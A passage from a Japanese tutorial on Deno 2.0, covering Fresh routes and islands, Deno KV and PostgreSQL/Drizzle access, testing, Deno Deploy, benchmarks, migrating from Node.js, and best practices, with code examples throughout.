    if (response.status === 404) {
      return ctx.renderNotFound();
    }

    const article: Article = await response.json();
    return ctx.render(article);
  },
};

export default function ArticlePage({ data: article }: PageProps<Article | null>) {
  if (!article) {
    return <div>記事が見つかりません</div>;
  }

  return (
    <>
      <Head>
        <title>{article.title} | My Blog</title>
        <meta name="description" content={article.content.slice(0, 160)} />
      </Head>
      <article class="max-w-3xl mx-auto px-4 py-8">
        <h1 class="text-4xl font-bold mb-4">{article.title}</h1>
        <div class="flex items-center gap-4 text-gray-600 mb-8">
          <span>著者: {article.author}</span>
          <time>{article.publishedAt}</time>
        </div>
        <div
          class="prose"
          dangerouslySetInnerHTML={{ __html: article.content }}
        />
      </article>
    </>
  );
}
```

### Islands（インタラクティブコンポーネント）

```typescript
// islands/Counter.tsx - クライアントサイドのインタラクティブコンポーネント
import { useSignal } from "@preact/signals";

interface CounterProps {
  initialCount?: number;
  step?: number;
}

export default function Counter({ initialCount = 0, step = 1 }: CounterProps) {
  const count = useSignal(initialCount);

  const increment = () => {
    count.value += step;
  };

  const decrement = () => {
    count.value -= step;
  };

  const reset = () => {
    count.value = initialCount;
  };

  return (
    <div class="flex flex-col items-center gap-4 p-6 border rounded-lg">
      <p class="text-4xl font-bold">{count}</p>
      <div class="flex gap-2">
        <button
          onClick={decrement}
          class="px-4 py-2 bg-red-500 text-white rounded hover:bg-red-600"
        >
          -{step}
        </button>
        <button
          onClick={reset}
          class="px-4 py-2 bg-gray-500 text-white rounded hover:bg-gray-600"
        >
          リセット
        </button>
        <button
          onClick={increment}
          class="px-4 py-2 bg-blue-500 text-white rounded hover:bg-blue-600"
        >
          +{step}
        </button>
      </div>
    </div>
  );
}
```

### APIルート

```typescript
// routes/api/users/index.ts - RESTful APIルート
import { Handlers } from "$fresh/server.ts";

const kv = await Deno.openKv();

interface User {
  id: string;
  name: string;
  email: string;
  createdAt: string;
}

export const handler: Handlers = {
  // ユーザー一覧の取得
  async GET(req) {
    const url = new URL(req.url);
    const limit = Number(url.searchParams.get("limit") ?? "10");

    const users: User[] = [];
    const entries = kv.list<User>({ prefix: ["users"] }, { limit });

    for await (const entry of entries) {
      users.push(entry.value);
    }

    return new Response(JSON.stringify(users), {
      headers: { "Content-Type": "application/json" },
    });
  },

  // ユーザーの作成
  async POST(req) {
    const body = await req.json();

    if (!body.name || !body.email) {
      return new Response(
        JSON.stringify({ error: "名前とメールアドレスは必須です" }),
        { status: 400, headers: { "Content-Type": "application/json" } }
      );
    }

    const user: User = {
      id: crypto.randomUUID(),
      name: body.name,
      email: body.email,
      createdAt: new Date().toISOString(),
    };

    await kv.set(["users", user.id], user);

    return new Response(JSON.stringify(user), {
      status: 201,
      headers: { "Content-Type": "application/json" },
    });
  },
};
```

---

## 10. データベース連携

### Deno KV（組み込みキーバリューストア）

Deno KVはDenoに組み込まれたキーバリューストアです。ローカル開発ではSQLiteをバックエンドとして使用し、Deno Deployではグローバルに分散されたデータストアを使用します。

```typescript
// Deno KVの基本操作
const kv = await Deno.openKv();

// 値の保存
await kv.set(["users", "user-001"], {
  id: "user-001",
  name: "田中太郎",
  email: "tanaka@example.com",
  createdAt: new Date(),
});

// 値の取得
const result = await kv.get<{ id: string; name: string; email: string }>(
  ["users", "user-001"]
);

if (result.value) {
  console.log("ユーザー:", result.value);
  console.log("バージョンスタンプ:", result.versionstamp);
}

// 値の削除
await kv.delete(["users", "user-001"]);

// アトミックトランザクション
const atomicResult = await kv.atomic()
  .check({ key: ["balance", "user-001"], versionstamp: null })
  .set(["balance", "user-001"], { amount: 10000 })
  .set(["transactions", crypto.randomUUID()], {
    type: "initial_deposit",
    amount: 10000,
    userId: "user-001",
    timestamp: new Date(),
  })
  .commit();

if (atomicResult.ok) {
  console.log("トランザクション成功");
} else {
  console.error("トランザクション失敗（競合が発生）");
}

// 楽観的並行性制御（OCC）
async function transferFunds(fromId: string, toId: string, amount: number) {
  while (true) {
    const fromBalance = await kv.get<{ amount: number }>(["balance", fromId]);
    const toBalance = await kv.get<{ amount: number }>(["balance", toId]);

    if (!fromBalance.value || fromBalance.value.amount < amount) {
      throw new Error("残高不足");
    }

    const result = await kv.atomic()
      .check(fromBalance)
      .check(toBalance)
      .set(["balance", fromId], { amount: fromBalance.value.amount - amount })
      .set(["balance", toId], {
        amount: (toBalance.value?.amount ?? 0) + amount,
      })
      .commit();

    if (result.ok) {
      return true;
    }
    // 競合が発生した場合はリトライ
    await new Promise(resolve => setTimeout(resolve, 10));
  }
}

// プレフィックスによる一覧取得
const users = kv.list<{ name: string; email: string }>(
  { prefix: ["users"] },
  { limit: 100, reverse: false }
);

for await (const entry of users) {
  console.log(entry.key, entry.value);
}

// リアルタイム更新の監視（Deno Deploy限定）
const watcher = kv.watch([["users", "user-001"]]);
for await (const [event] of watcher) {
  console.log("更新検知:", event.key, event.value);
}
```

### PostgreSQLの接続（postgresドライバー）

```typescript
import { Pool } from "npm:pg@8";

// 接続プールの作成
const pool = new Pool({
  connectionString: Deno.env.get("DATABASE_URL"),
  max: 10,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
});

// データベース操作のラッパー
async function query<T>(sql: string, params?: unknown[]): Promise<T[]> {
  const client = await pool.connect();
  try {
    const result = await client.query(sql, params);
    return result.rows as T[];
  } finally {
    client.release();
  }
}

// テーブルの作成
await query(`
  CREATE TABLE IF NOT EXISTS users (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name VARCHAR(100) NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
  )
`);

// ユーザーの作成
interface User {
  id: string;
  name: string;
  email: string;
  created_at: Date;
}

async function createUser(name: string, email: string): Promise<User> {
  const [user] = await query<User>(
    "INSERT INTO users (name, email) VALUES ($1, $2) RETURNING *",
    [name, email]
  );
  return user;
}

// ユーザーの検索
async function findUserByEmail(email: string): Promise<User | null> {
  const users = await query<User>(
    "SELECT * FROM users WHERE email = $1",
    [email]
  );
  return users[0] ?? null;
}

// ユーザー一覧の取得（ページネーション付き）
async function listUsers(page: number, pageSize: number): Promise<{
  users: User[];
  total: number;
}> {
  const offset = (page - 1) * pageSize;

  const [users, [{ count }]] = await Promise.all([
    query<User>(
      "SELECT * FROM users ORDER BY created_at DESC LIMIT $1 OFFSET $2",
      [pageSize, offset]
    ),
    query<{ count: string }>("SELECT COUNT(*) as count FROM users"),
  ]);

  return {
    users,
    total: parseInt(count, 10),
  };
}

// 使用例
const newUser = await createUser("田中太郎", "tanaka@example.com");
console.log("作成したユーザー:", newUser);

const { users, total } = await listUsers(1, 10);
console.log(`ユーザー一覧 (全${total}件):`, users);
```

### Drizzle ORMの使用

```typescript
import { drizzle } from "npm:drizzle-orm@0.30/node-postgres";
import { pgTable, uuid, varchar, timestamp } from "npm:drizzle-orm@0.30/pg-core";
import { eq, desc, sql } from "npm:drizzle-orm@0.30";
import { Pool } from "npm:pg@8";

// スキーマ定義
export const users = pgTable("users", {
  id: uuid("id").primaryKey().defaultRandom(),
  name: varchar("name", { length: 100 }).notNull(),
  email: varchar("email", { length: 255 }).notNull().unique(),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});

export const posts = pgTable("posts", {
  id: uuid("id").primaryKey().defaultRandom(),
  title: varchar("title", { length: 200 }).notNull(),
  content: varchar("content").notNull(),
  authorId: uuid("author_id").notNull().references(() => users.id),
  createdAt: timestamp("created_at", { withTimezone: true }).defaultNow(),
});

// DBの初期化
const pool = new Pool({ connectionString: Deno.env.get("DATABASE_URL") });
const db = drizzle(pool, { schema: { users, posts } });

// クエリの実行
const allUsers = await db.select().from(users).orderBy(desc(users.createdAt));

// リレーションのJOIN
const postsWithAuthors = await db
  .select({
    postId: posts.id,
    title: posts.title,
    authorName: users.name,
    createdAt: posts.createdAt,
  })
  .from(posts)
  .innerJoin(users, eq(posts.authorId, users.id))
  .orderBy(desc(posts.createdAt))
  .limit(10);

// 集計クエリ
const userPostCounts = await db
  .select({
    userId: users.id,
    userName: users.name,
    postCount: sql<number>`count(${posts.id})`.as("post_count"),
  })
  .from(users)
  .leftJoin(posts, eq(users.id, posts.authorId))
  .groupBy(users.id, users.name)
  .orderBy(desc(sql`post_count`));
```

---

## 11. テストとカバレッジ

### Deno.testの基本

```typescript
// user_service.test.ts
import { assertEquals, assertRejects, assertObjectMatch } from "jsr:@std/assert@1";

// テスト対象のモジュール
import { UserService } from "./user_service.ts";

// シンプルなテスト
Deno.test("UserService: ユーザーの作成", async () => {
  const service = new UserService();
  const user = await service.create({ name: "田中太郎", email: "tanaka@example.com" });

  assertObjectMatch(user, {
    name: "田中太郎",
    email: "tanaka@example.com",
  });
  assertEquals(typeof user.id, "string");
});

// サブテストの使用
Deno.test("UserService", async (t) => {
  const service = new UserService();

  await t.step("ユーザーの作成", async () => {
    const user = await service.create({ name: "テストユーザー", email: "test@example.com" });
    assertEquals(user.name, "テストユーザー");
  });

  await t.step("ユーザーの取得", async () => {
    const users = await service.findAll();
    assertEquals(users.length > 0, true);
  });

  await t.step("存在しないユーザーの取得でエラー", async () => {
    await assertRejects(
      () => service.findById("non-existent-id"),
      Error,
      "ユーザーが見つかりません"
    );
  });
});

// 非同期テスト
Deno.test("HTTPリクエストのテスト", async () => {
  const server = Deno.serve({ port: 9999 }, (req) => {
    return new Response(JSON.stringify({ message: "test" }), {
      headers: { "Content-Type": "application/json" },
    });
  });

  try {
    const response = await fetch("http://localhost:9999/");
    assertEquals(response.status, 200);

    const data = await response.json();
    assertEquals(data.message, "test");
  } finally {
    server.shutdown();
  }
});

// タイムアウトの設定
Deno.test({
  name: "長時間実行テスト",
  fn: async () => {
    // タイムアウトは60秒
    await new Promise(resolve => setTimeout(resolve, 100));
    assertEquals(1, 1);
  },
  sanitizeOps: false,
  sanitizeResources: false,
});

// テストのスキップ
Deno.test({
  name: "CI環境でのみスキップするテスト",
  ignore: Deno.env.get("CI") === "true",
  fn: () => {
    // このテストはCIではスキップされる
    assertEquals(1, 1);
  },
});
```

### モックとスタブ

```typescript
import { assertEquals } from "jsr:@std/assert@1";
import { spy, stub, assertSpyCalls, assertSpyCallArg } from "jsr:@std/testing@1/mock";

// 関数のスパイ
Deno.test("スパイのテスト", () => {
  const myFunction = spy((x: number) => x * 2);

  myFunction(5);
  myFunction(10);

  assertSpyCalls(myFunction, 2);
  assertSpyCallArg(myFunction, 0, 0, 5);  // 1回目の第1引数が5
  assertSpyCallArg(myFunction, 1, 0, 10); // 2回目の第1引数が10
});

// メソッドのスタブ
interface DatabaseService {
  findUser(id: string): Promise<{ id: string; name: string } | null>;
}

class UserController {
  constructor(private db: DatabaseService) {}

  async getUserName(id: string): Promise<string> {
    const user = await this.db.findUser(id);
    if (!user) throw new Error("ユーザーが見つかりません");
    return user.name;
  }
}

Deno.test("スタブのテスト", async () => {
  const mockDb: DatabaseService = {
    findUser: spy((_id: string) =>
      Promise.resolve({ id: "123", name: "テストユーザー" })
    ),
  };

  const controller = new UserController(mockDb);
  const name = await controller.getUserName("123");

  assertEquals(name, "テストユーザー");
  assertSpyCalls(mockDb.findUser as ReturnType<typeof spy>, 1);
});

// タイマーのフェイク化
import { FakeTime } from "jsr:@std/testing@1/time";

Deno.test("タイマーのテスト", () => {
  using time = new FakeTime();

  let called = false;
  setTimeout(() => { called = true; }, 1000);

  assertEquals(called, false);
  time.tick(1000);
  assertEquals(called, true);
});
```

### カバレッジの測定

```bash
# カバレッジデータの収集
deno test --coverage=./coverage_data

# カバレッジレポートの生成
deno coverage ./coverage_data

# 詳細なレポート
deno coverage ./coverage_data --detailed

# LCOVフォーマットで出力
deno coverage ./coverage_data --lcov > coverage.lcov

# HTMLレポートの生成（genhtml使用）
genhtml coverage.lcov --output-directory coverage_html

# 特定のファイルを除外
deno coverage ./coverage_data --exclude=".*_test\.ts"
```

### スナップショットテスト

```typescript
import { assertSnapshot } from "jsr:@std/testing@1/snapshot";

interface Product {
  id: string;
  name: string;
  price: number;
  category: string;
}

function formatProduct(product: Product): string {
  return `[${product.category}] ${product.name}: ¥${product.price.toLocaleString()}`;
}

Deno.test("スナップショットテスト", async (t) => {
  const product: Product = {
    id: "prod-001",
    name: "Denoマグカップ",
    price: 2800,
    category: "グッズ",
  };

  await assertSnapshot(t, formatProduct(product));
  // 初回実行時: スナップショットを作成
  // 2回目以降: 前回のスナップショットと比較
});
```

---

## 12. Deno Deployによるエッジデプロイ

Deno Deployは、Denoアプリケーションをグローバルなエッジネットワークにデプロイするためのサービスです。世界35以上のリージョンでコードが実行され、ユーザーに最も近いリージョンで処理が行われます。

### Deno Deployの特徴

- **ゼロコールドスタート**: V8 Isolatesを使用しており、コンテナのような起動時間がない
- **グローバル分散**: Cloudflare Workersと同様のエッジネットワーク
- **Deno KV統合**: グローバルに分散されたKVストアが利用可能
- **無料枠**: 月100,000リクエストまで無料

### デプロイの手順

```bash
# deployctlのインストール
deno install -gArf jsr:@deno/deployctl

# デプロイ（GitHubとの連携なし）
deployctl deploy --project=my-project main.ts

# 本番環境へのデプロイ
deployctl deploy --project=my-project --prod main.ts
```

### GitHub Actionsとの統合

```yaml
# .github/workflows/deploy.yml
name: Deploy to Deno Deploy

on:
  push:
    branches: [main]

jobs:
  deploy:
    name: Deploy
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - uses: actions/checkout@v4

      - name: Deploy to Deno Deploy
        uses: denoland/deployctl@v1
        with:
          project: "my-project-name"
          entrypoint: "main.ts"
          root: "."
```

### エッジ関数の例

```typescript
// main.ts - Deno Deploy用エントリーポイント
import { Hono } from "npm:hono@4";

const app = new Hono();
const kv = await Deno.openKv();

// エッジでのA/Bテスト
app.get("/", async (c) => {
  const country = c.req.header("CF-IPCountry") ?? "Unknown";
  const region = c.req.header("CF-Region") ?? "Unknown";

  // KVからページビューをインクリメント
  const viewsKey = ["pageviews", new Date().toISOString().slice(0, 10)];
  await kv.atomic()
    .mutate({
      type: "sum",
      key: viewsKey,
      value: new Deno.KvU64(1n),
    })
    .commit();

  const views = await kv.get<Deno.KvU64>(viewsKey);

  return c.html(`
    <!DOCTYPE html>
    <html lang="ja">
    <head>
      <meta charset="UTF-8">
      <title>Deno Deploy エッジアプリ</title>
    </head>
    <body>
      <h1>Deno Deploy エッジアプリ</h1>
      <p>アクセス元: ${country} / ${region}</p>
      <p>本日のページビュー: ${views.value?.toString() ?? "0"}</p>
      <p>実行リージョン: ${Deno.env.get("DENO_REGION") ?? "不明"}</p>
    </body>
    </html>
  `);
});

// Geolocationを活用したコンテンツ配信
app.get("/api/localized-content", async (c) => {
  const country = c.req.header("CF-IPCountry") ?? "JP";
  const lang = country === "JP" ? "ja" : "en";

  const content = await kv.get<{ title: string; body: string }>(
    ["content", lang, "home"]
  );

  return c.json({
    country,
    lang,
    content: content.value,
  });
});

Deno.serve(app.fetch);
```

---

## 13. パフォーマンス比較

### ベンチマークの実行方法

Denoには組み込みのベンチマークツールが含まれています。

```typescript
// bench.ts - ベンチマークの定義
// 文字列操作のベンチマーク
Deno.bench("文字列結合（+演算子）", () => {
  let result = "";
  for (let i = 0; i < 1000; i++) {
    result += "a";
  }
});

Deno.bench("文字列結合（配列join）", () => {
  const parts: string[] = [];
  for (let i = 0; i < 1000; i++) {
    parts.push("a");
  }
  parts.join("");
});

// JSON処理のベンチマーク
const testData = Array.from({ length: 1000 }, (_, i) => ({
  id: i,
  name: `ユーザー${i}`,
  email: `user${i}@example.com`,
  createdAt: new Date().toISOString(),
}));

Deno.bench("JSON.stringify", () => {
  JSON.stringify(testData);
});

Deno.bench("JSON.parse", () => {
  JSON.parse(JSON.stringify(testData));
});

// 暗号化のベンチマーク
Deno.bench({
  name: "SHA-256ハッシュ（WebCrypto）",
  async fn() {
    await crypto.subtle.digest("SHA-256", new TextEncoder().encode("Hello, Deno!"));
  },
});
```

```bash
# ベンチマークの実行
deno bench bench.ts

# 詳細な統計情報付き
deno bench --unstable-bench bench.ts
```

### Node.js・Deno・Bunのパフォーマンス比較

実際のベンチマーク結果（参考値、環境によって異なります）：

```
HTTP サーバー（req/sec）
- Bun:    ~120,000
- Deno:   ~90,000
- Node.js: ~75,000

JSONシリアライズ（ops/sec）
- Deno:    ~8,500,000
- Node.js: ~7,200,000
- Bun:     ~9,100,000

起動時間（ms）
- Deno:    ~30ms
- Bun:     ~10ms
- Node.js: ~50ms

TypeScriptコンパイル（ms / 100ファイル）
- Deno:    ~800ms
- Bun:     ~200ms（SWC使用）
- Node.js: ~2000ms（tsc使用）
```

Denoは高いパフォーマンスを持ちながら、セキュリティとTypeScript対応を標準で提供している点が強みです。

### メモリ使用量の最適化

```typescript
// ストリームを使用した大容量ファイルの処理
async function processLargeFile(inputPath: string, outputPath: string) {
  const inputFile = await Deno.open(inputPath, { read: true });
  const outputFile = await Deno.open(outputPath, { write: true, create: true });

  try {
    // ストリームパイプラインでメモリ効率よく処理
    await inputFile.readable
      .pipeThrough(new TextDecoderStream())
      .pipeThrough(new TransformStream({
        transform(chunk, controller) {
          // 行単位で変換処理
          const processed = chunk
            .split("\n")
            .map(line => line.toUpperCase())
            .join("\n");
          controller.enqueue(processed);
        },
      }))
      .pipeThrough(new TextEncoderStream())
      .pipeTo(outputFile.writable);
  } finally {
    inputFile.close();
  }
}
```

---

## 14. Node.jsからの移行ガイド

### 段階的な移行戦略

Node.jsプロジェクトをDenoに移行する際は、段階的なアプローチが推奨されます。

**ステップ1: パッケージのインポートを更新**

```typescript
// Before (Node.js)
const express = require("express");
const path = require("path");
const fs = require("fs");

// After (Deno 2.0)
import express from "npm:express@4";
import path from "node:path";
import fs from "node:fs";
```

**ステップ2: package.jsonをdeno.jsonに移行**

```json
// package.json (Node.js)
{
  "name": "my-app",
  "scripts": {
    "start": "node src/index.js",
    "dev": "nodemon src/index.js",
    "test": "jest",
    "lint": "eslint src/"
  },
  "dependencies": {
    "express": "^4.18.0",
    "dotenv": "^16.0.0"
  },
  "devDependencies": {
    "jest": "^29.0.0",
    "eslint": "^8.0.0"
  }
}
```

```json
// deno.json (Deno 2.0)
{
  "tasks": {
    "start": "deno run --allow-net --allow-read --allow-env src/index.ts",
    "dev": "deno run --allow-net --allow-read --allow-env --watch src/index.ts",
    "test": "deno test --allow-net --allow-read",
    "lint": "deno lint src/"
  },
  "imports": {
    "express": "npm:express@4",
    "dotenv/config": "npm:dotenv@16/config"
  }
}
```

### よくある移行パターン

**1. CommonJSからESModulesへ**

```typescript
// Before (Node.js CommonJS)
const { EventEmitter } = require("events");
const { join } = require("path");
module.exports = { myFunction };

// After (Deno ESModules)
import { EventEmitter } from "node:events";
import { join } from "node:path";
export { myFunction };
```

**2. __dirnameと__filenameの代替**

```typescript
// Before (Node.js)
const __dirname = path.dirname(__filename);
const configPath = path.join(__dirname, "config.json");

// After (Deno)
import { dirname, fromFileUrl, join } from "jsr:@std/path@1";

const __dirname = dirname(fromFileUrl(import.meta.url));
const configPath = join(__dirname, "config.json");
```

**3. process.exitの代替**

```typescript
// Node.jsと同じAPIが使える
process.exit(0);  // node:processから
// または
Deno.exit(0);  // Deno APIを使用
```

**4. Bufferの代替**

```typescript
// Before (Node.js)
const buf = Buffer.from("Hello", "utf8");
const hexStr = buf.toString("hex");

// After (Deno) - Node.js互換
import { Buffer } from "node:buffer";
const buf = Buffer.from("Hello", "utf8");
const hexStr = buf.toString("hex");

// Deno標準APIを使う場合
import { encodeHex } from "jsr:@std/encoding@1/hex";
const data = new TextEncoder().encode("Hello");
const hexStr = encodeHex(data);
```

**5. dotenvの代替**

```typescript
// Before (Node.js)
require("dotenv").config();
const port = process.env.PORT;

// After (Deno)
import { load } from "jsr:@std/dotenv@0";
const env = await load();
const port = env.PORT ?? Deno.env.get("PORT");
```

### 互換性チェックリスト

```
移行前に確認すること:
□ npm パッケージが Deno で動作するか確認（npm:パッケージ名 で試す）
□ ネイティブアドオン（.node ファイル）を使っていないか
□ CommonJSのみのパッケージがないか（多くはESM版もある）
□ node_modules に依存したツール（webpack等）の代替を検討
□ テストフレームワークの移行（Jest → Deno.test）
□ ESLintの設定をdeno lintに移行
□ .envファイルの@std/dotenvへの移行
□ パーミッションが必要なAPIの洗い出し
```

---

## 15. ベストプラクティス

### セキュリティのベストプラクティス

```typescript
// 1. 最小権限の原則
// 必要なパーミッションのみを許可する

// 悪い例
// deno run -A main.ts

// 良い例
// deno run --allow-net=api.example.com --allow-read=./config.json --allow-env=PORT main.ts

// 2. 環境変数のバリデーション
function getRequiredEnv(name: string): string {
  const value = Deno.env.get(name);
  if (!value) {
    throw new Error(`必須の環境変数 ${name} が設定されていません`);
  }
  return value;
}

const config = {
  port: parseInt(Deno.env.get("PORT") ?? "3000", 10),
  databaseUrl: getRequiredEnv("DATABASE_URL"),
  jwtSecret: getRequiredEnv("JWT_SECRET"),
  nodeEnv: Deno.env.get("NODE_ENV") ?? "development",
};

// 3. 入力のサニタイゼーション
import { z } from "npm:zod@3";
import DOMPurify from "npm:dompurify@3";

const RequestSchema = z.object({
  name: z.string().min(1).max(100).trim(),
  email: z.string().email().toLowerCase(),
  message: z.string().min(1).max(5000),
});

async function handleFormSubmit(req: Request): Promise<Response> {
  const body = await req.json();
  const result = RequestSchema.safeParse(body);

  if (!result.success) {
    return new Response(JSON.stringify({ errors: result.error.issues }), {
      status: 400,
    });
  }

  const { name, email, message } = result.data;
  // HTMLが含まれる可能性のあるフィールドはサニタイズ
  const safeMessage = DOMPurify.sanitize(message);

  return new Response(JSON.stringify({ success: true }));
}
```

### エラーハンドリングのベストプラクティス

```typescript
// カスタムエラークラスの定義
class AppError extends Error {
  constructor(
    message: string,
    public readonly code: string,
    public readonly statusCode: number = 500,
    public readonly details?: unknown
  ) {
    super(message);
    this.name = "AppError";
  }
}

class NotFoundError extends AppError {
  constructor(resource: string, id: string) {
    super(
      `${resource} with id "${id}" was not found`,
      "NOT_FOUND",
      404
    );
  }
}

class ValidationError extends AppError {
  constructor(details: unknown) {
    super("バリデーションエラー", "VALIDATION_ERROR", 400, details);
  }
}

// エラーハンドラーミドルウェア
function createErrorHandler() {
  return async (req: Request): Promise<Response> => {
    try {
      return await handleRequest(req);
    } catch (error) {
      if (error instanceof AppError) {
        return new Response(
          JSON.stringify({
            error: error.message,
            code: error.code,
            details: error.details,
          }),
          {
            status: error.statusCode,
            headers: { "Content-Type": "application/json" },
          }
        );
      }

      // 予期しないエラー
      console.error("予期しないエラー:", error);
      return new Response(
        JSON.stringify({ error: "内部サーバーエラーが発生しました" }),
        { status: 500, headers: { "Content-Type": "application/json" } }
      );
    }
  };
}

// Resultパターンの活用
type Result<T, E = Error> =
  | { success: true; data: T }
  | { success: false; error: E };

async function safeOperation<T>(
  fn: () => Promise<T>
): Promise<Result<T>> {
  try {
    const data = await fn();
    return { success: true, data };
  } catch (error) {
    return { success: false, error: error as Error };
  }
}

const result = await safeOperation(async () => {
  const response = await fetch("https://api.example.com/data");
  if (!response.ok) throw new Error(`HTTP ${response.status}`);
  return response.json();
});

if (result.success) {
  console.log("データ取得成功:", result.data);
} else {
  console.error("データ取得失敗:", result.error.message);
}
```

### コード整理のベストプラクティス

```typescript
// 依存性注入パターン
interface Logger {
  info(message: string, context?: Record<string, unknown>): void;
  error(message: string, error?: unknown): void;
}

interface UserRepository {
  findById(id: string): Promise<User | null>;
  save(user: User): Promise<User>;
  delete(id: string): Promise<void>;
}

interface User {
  id: string;
  name: string;
  email: string;
}

class ConsoleLogger implements Logger {
  info(message: string, context?: Record<string, unknown>) {
    console.log(JSON.stringify({
      level: "info",
      message,
      context,
      timestamp: new Date().toISOString(),
    }));
  }

  error(message: string, error?: unknown) {
    console.error(JSON.stringify({
      level: "error",
      message,
      error: error instanceof Error ? error.message : String(error),
      timestamp: new Date().toISOString(),
    }));
  }
}

class KvUserRepository implements UserRepository {
  constructor(private readonly kv: Deno.Kv) {}

  async findById(id: string): Promise<User | null> {
    const result = await this.kv.get<User>(["users", id]);
    return result.value;
  }

  async save(user: User): Promise<User> {
    await this.kv.set(["users", user.id], user);
    return user;
  }

  async delete(id: string): Promise<void> {
    await this.kv.delete(["users", id]);
  }
}

class UserService {
  constructor(
    private readonly userRepo: UserRepository,
    private readonly logger: Logger
  ) {}

  async createUser(name: string, email: string): Promise<User> {
    this.logger.info("ユーザー作成開始", { name, email });

    const user: User = {
      id: crypto.randomUUID(),
      name,
      email,
    };

    const saved = await this.userRepo.save(user);
    this.logger.info("ユーザー作成完了", { userId: saved.id });

    return saved;
  }

  async deleteUser(id: string): Promise<void> {
    const user = await this.userRepo.findById(id);
    if (!user) {
      throw new NotFoundError("ユーザー", id);
    }

    await this.userRepo.delete(id);
    this.logger.info("ユーザー削除完了", { userId: id });
  }
}

// 依存性の組み立て
const kv = await Deno.openKv();
const logger = new ConsoleLogger();
const userRepo = new KvUserRepository(kv);
const userService = new UserService(userRepo, logger);
```

### CI/CDのベストプラクティス

```yaml
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  test:
    name: テスト・リント
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Denoのセットアップ
        uses: denoland/setup-deno@v2
        with:
          deno-version: v2.x

      - name: 依存関係のキャッシュ確認
        run: deno cache --reload src/main.ts

      - name: 型チェック
        run: deno check src/**/*.ts

      - name: リント
        run: deno lint

      - name: フォーマットチェック
        run: deno fmt --check

      - name: テスト実行（カバレッジ付き）
        run: deno test --allow-all --coverage=./coverage

      - name: カバレッジレポート生成
        run: deno coverage ./coverage --lcov > coverage.lcov

      - name: Codecovへのアップロード
        uses: codecov/codecov-action@v4
        with:
          file: coverage.lcov

  build:
    name: ビルド確認
    runs-on: ubuntu-latest
    needs: test

    steps:
      - uses: actions/checkout@v4

      - uses: denoland/setup-deno@v2
        with:
          deno-version: v2.x

      - name: コンパイルチェック
        run: deno compile --allow-all src/main.ts -o /tmp/app
```

### パフォーマンス最適化のベストプラクティス

```typescript
// 1. 遅延初期化
let _db: Deno.Kv | undefined;

async function getDb(): Promise<Deno.Kv> {
  if (!_db) {
    _db = await Deno.openKv();
  }
  return _db;
}

// 2. キャッシュの活用
const cache = new Map<string, { value: unknown; expiresAt: number }>();

async function cachedFetch<T>(
  url: string,
  ttl: number = 60000
): Promise<T> {
  const cached = cache.get(url);
  if (cached && cached.expiresAt > Date.now()) {
    return cached.value as T;
  }

  const response = await fetch(url);
  const data = await response.json() as T;

  cache.set(url, {
    value: data,
    expiresAt: Date.now() + ttl,
  });

  return data;
}

// 3. 並列処理の活用
async function fetchMultipleApis() {
  const [users, products, orders] = await Promise.all([
    fetch("https://api.example.com/users").then(r => r.json()),
    fetch("https://api.example.com/products").then(r => r.json()),
    fetch("https://api.example.com/orders").then(r => r.json()),
  ]);

  return { users, products, orders };
}

// 4. ストリーミングレスポンス
function streamingResponse(): Response {
  const encoder = new TextEncoder();
  let intervalId: number;

  const stream = new ReadableStream({
    start(controller) {
      let count = 0;
      intervalId = setInterval(() => {
        if (count >= 10) {
          controller.close();
          clearInterval(intervalId);
          return;
        }
        controller.enqueue(
          encoder.encode(`data: ${JSON.stringify({ count })}\n\n`)
        );
        count++;
      }, 1000);
    },
    cancel() {
      clearInterval(intervalId);
    },
  });

  return new Response(stream, {
    headers: {
      "Content-Type": "text/event-stream",
      "Cache-Control": "no-cache",
      "Connection": "keep-alive",
    },
  });
}
```

---

## まとめ

Deno 2.0は、Node.jsの設計上の問題点を解決しながら、既存のNode.jsエコシステムとの完全な互換性を実現した画期的なリリースです。本記事で解説した主要なポイントを振り返りましょう。

### Deno 2.0の主要な強み

**セキュリティ**: デフォルトで安全な実行環境を提供し、パーミッションによる細粒度のアクセス制御が可能です。サプライチェーン攻撃のリスクを大幅に低減します。

**TypeScriptネイティブ**: 設定ファイル不要でTypeScriptを直接実行でき、開発体験が向上します。

**Web標準準拠**: ブラウザと同じAPIを使用でき、フロントエンドとバックエンドのコード共有が容易です。

**npm互換性**: `npm:`スペシファイアにより、既存のnpmエコシステムをそのまま活用できます。

**組み込みツール**: リンター、フォーマッター、テストランナー、バンドラーが標準で含まれています。

**Deno KV**: 設定不要で使えるグローバル分散KVストアが開発をシンプルにします。

### 導入をお勧めするケース

- 新規のバックエンドプロジェクト
- セキュリティが重要なサービス
- エッジコンピューティングを活用したいアプリ
- TypeScriptを積極的に使いたいプロジェクト
- マイクロサービスアーキテクチャ
- サーバーレス関数

Deno 2.0は成熟度を大きく高め、本番環境での使用に十分な安定性を持つようになりました。Node.jsからの段階的な移行も現実的な選択肢となっています。

---

## 関連リソース

- [Deno公式サイト](https://deno.land)
- [Deno公式ドキュメント](https://docs.deno.com)
- [JSRレジストリ](https://jsr.io)
- [Deno Deploy](https://deno.com/deploy)
- [Freshフレームワーク](https://fresh.deno.dev)
- [Hono - 軽量Webフレームワーク](https://hono.dev)

---

開発ツールのお探しなら、[DevToolBox](https://usedevtools.com)もぜひご活用ください。JSONフォーマッター、Base64エンコーダー/デコーダー、URL解析ツールなど、開発に役立つツールを多数揃えています。Denoでのバックエンド開発と組み合わせて活用することで、開発効率をさらに高めることができます。
